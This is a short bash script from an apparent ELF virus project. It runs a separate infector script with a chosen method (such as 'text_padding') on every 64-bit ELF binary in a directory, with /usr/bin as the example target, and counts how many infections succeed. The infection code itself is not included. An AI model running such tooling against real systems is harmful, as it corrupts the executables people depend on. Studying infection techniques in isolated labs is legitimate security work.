#!/bin/bash
# this is a script that runs a series of commands to build and infect victims with different
# infection methods. This script is not sandboxed and is meant to provide convenience during
# infection algorithm development. Run with care.

# please build the //infector package before running this script.
# run with infector/infect_victims.sh [method] [dir]
# for example: bazel build //infector/... --config=gcc_x86_64 && infector/infect_victims.sh text_padding /usr/bin
IFS=""

rm_trailing_slash() {
    echo "$1" | sed 's/\/*$//g'
}

blue=$(tput setaf 4)
red=$(tput setaf 1)
normal=$(tput sgr0)

success_counter=0
fail_counter=0
for file_name in $(rm_trailing_slash $2)/*
do
  type=$(file $file_name)

  if [[ $type == *"ELF 64-bit LSB"* ]]; then
    {
        infector/infect_victim.sh $1 "$file_name"
    } > /tmp/result 2>&1
    # only print when we failed to infect.
    result=$(cat /tmp/result)
    if [[ $result == *"Running virus code"* && $result != *"Segmentation fault"* ]]; then
        detail="${blue}success${normal}"
        success_counter=$((success_counter+1))
    else
        detail="${red}fail $result${normal}"
        fail_counter=$((fail_counter+1))
    fi
    elf_type=$(readelf $file_name -h | grep Type | cut -f 2 -d ':' | cut -f 1 -d '(' | xargs)
    printf ' [%-45s] == type: %-5s %s\n' $file_name $elf_type $detail
  fi

done
echo "infected: $success_counter, failed: $fail_counter"